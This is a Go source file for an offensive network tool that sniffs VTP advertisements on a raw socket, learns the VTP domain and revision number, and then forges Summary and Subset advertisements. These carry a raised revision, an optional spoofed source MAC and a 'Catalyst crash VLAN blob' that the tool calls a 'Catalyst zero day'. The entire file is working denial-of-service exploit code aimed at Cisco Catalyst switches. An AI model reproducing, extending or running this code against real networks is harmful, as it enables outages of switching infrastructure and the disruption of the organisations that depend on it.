package vtpcrash

import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"time"
)

const defaultUpdater = 0x0a0d3a01 // 10.13.58.1 (default)

type rawSocket interface {
	Send(frame []byte) error
	Recv(buf []byte) (int, error)
	Close() error
}

// Crasher sends forged VTP advertisements with the Catalyst crash VLAN blob
// (vtp_th_dos_crash / VTP_ATTACK_CRASH).
type Crasher struct {
	Interface      string
	RevisionNumber int // -1 = learned revision + 1
	SourceMAC      string

	sourceMACOverride net.HardwareAddr
	lastForgedRev     uint32

	lastUpdater    uint32
	lastTimestamp  [12]byte
	hasSummaryMeta bool
}

func (c *Crasher) Run() error {
	iface, err := net.InterfaceByName(c.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", c.Interface, err)
	}
	if len(iface.HardwareAddr) != 6 {
		return fmt.Errorf("interface %s has invalid MAC", iface.Name)
	}
	srcMAC := append(net.HardwareAddr{}, iface.HardwareAddr...)
	if c.SourceMAC != "" {
		override, err := parseMACString(c.SourceMAC)
		if err != nil {
			return fmt.Errorf("source MAC %q: %w", c.SourceMAC, err)
		}
		c.sourceMACOverride = override
	}
	sendAs := c.sendMAC(srcMAC)

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	stop := make(chan struct{})
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		close(stop)
		fmt.Printf("\n%s Catalyst zero day stopped.\n", vtpTag)
		os.Exit(0)
	}()

	fmt.Printf("%s Waiting for VTP Summary/Subset on %s (Catalyst zero day)... (Ctrl+C to stop)\n", vtpTag, iface.Name)
	fmt.Printf("%s Listening for VTP and DTP packets...\n", vtpTag)

	var frameNum int
	buf := make([]byte, 65535)
	for {
		select {
		case <-stop:
			return nil
		default:
		}
		n, err := sock.Recv(buf)
		if err != nil {
			select {
			case <-stop:
				return nil
			default:
				return fmt.Errorf("recv: %w", err)
			}
		}
		frame := append([]byte{}, buf[:n]...)

		c.printReceivedFrame(iface.Name, &frameNum, frame)

		if macEqual(frame[6:12], sendAs) {
			continue
		}

		if _, err := c.tryCrash(sock, sendAs, frame); err != nil {
			return err
		}
	}
}

func (c *Crasher) printReceivedFrame(iface string, frameNum *int, frame []byte) {
	*frameNum++
	if pr, ok := printReceived(frame, iface, *frameNum); ok {
		fmt.Printf("%s Recieved data from %s:\n", pr.Tag, pr.SrcMAC)
		fmt.Printf("%s\n\n", pr.Body)
	}
}

func (c *Crasher) tryCrash(sock rawSocket, srcMAC net.HardwareAddr, frame []byte) (bool, error) {
	learned, ok := parseLearnedVTP(frame)
	if !ok {
		return false, nil
	}
	if learned.Code != vtpCodeSummary && learned.Code != vtpCodeSubset {
		return false, nil
	}
	c.rememberSummaryMeta(learned)

	revision := c.forgeRevision(learned.Revision)
	if revision <= c.lastForgedRev {
		return false, nil
	}

	domain := make([]byte, vtpDomainSize)
	copy(domain, learned.Domain)
	updater, timestamp := c.forgeMeta(learned)

	digest := generateVTPMD5(updater, revision, domain, learned.DomLen, vlanCiscoCrash, learned.Version)
	if c.RevisionNumber >= 0 {
		fmt.Printf("%s Learned domain %q revision %d — sending Catalyst zero day with revision %d as %s\n",
			vtpTag, printable(domain[:learned.DomLen]), learned.Revision, revision, formatMAC(srcMAC))
	} else {
		fmt.Printf("%s Learned domain %q revision %d — sending Catalyst zero day as %s\n",
			vtpTag, printable(domain[:learned.DomLen]), learned.Revision, formatMAC(srcMAC))
	}

	summary := buildSummaryFrame(srcMAC, learned.Version, 1, domain, learned.DomLen, revision, updater, timestamp[:], digest)
	if err := sock.Send(summary); err != nil {
		return false, fmt.Errorf("send summary: %w", err)
	}
	fmt.Printf("%s Sent VTP Summary Advertisement (Catalyst zero day)\n", vtpTag)
	time.Sleep(200 * time.Millisecond)

	subset := buildSubsetFrame(srcMAC, learned.Version, 1, domain, learned.DomLen, revision, vlanCiscoCrash)
	if err := sock.Send(subset); err != nil {
		return false, fmt.Errorf("send subset: %w", err)
	}
	fmt.Printf("%s Sent VTP Subset Advertisement (Catalyst crash VLAN blob)\n", vtpTag)
	c.lastForgedRev = revision
	return true, nil
}

func (c *Crasher) forgeRevision(learned uint32) uint32 {
	if c.RevisionNumber >= 0 {
		return uint32(c.RevisionNumber)
	}
	return learned + 1
}

func (c *Crasher) sendMAC(ifaceMAC net.HardwareAddr) net.HardwareAddr {
	if len(c.sourceMACOverride) == 6 {
		return c.sourceMACOverride
	}
	return ifaceMAC
}

func parseMACString(s string) (net.HardwareAddr, error) {
	hw, err := net.ParseMAC(s)
	if err != nil {
		return nil, err
	}
	if len(hw) != 6 {
		return nil, fmt.Errorf("invalid MAC length %d", len(hw))
	}
	return hw, nil
}

func (c *Crasher) rememberSummaryMeta(learned learnedVTP) {
	if learned.Code != vtpCodeSummary {
		return
	}
	if learned.Updater != 0 {
		c.lastUpdater = learned.Updater
	}
	if learned.Timestamp != [12]byte{} {
		c.lastTimestamp = learned.Timestamp
	}
	c.hasSummaryMeta = true
}

func (c *Crasher) forgeMeta(learned learnedVTP) (uint32, [12]byte) {
	updater := uint32(defaultUpdater)
	timestamp := currentVTPTimestamp()
	if learned.Code == vtpCodeSummary {
		if learned.Updater != 0 {
			updater = learned.Updater
		}
		if learned.Timestamp != [12]byte{} {
			timestamp = learned.Timestamp
		}
	} else if c.hasSummaryMeta {
		if c.lastUpdater != 0 {
			updater = c.lastUpdater
		}
		if c.lastTimestamp != [12]byte{} {
			timestamp = c.lastTimestamp
		}
	}
	return updater, timestamp
}

func currentVTPTimestamp() [12]byte {
	var ts [12]byte
	now := time.Now().UTC()
	s := fmt.Sprintf("%02d%02d%02d%02d%02d%02d",
		now.Year()%100, int(now.Month()), now.Day(),
		now.Hour(), now.Minute(), now.Second())
	copy(ts[:], s)
	return ts
}
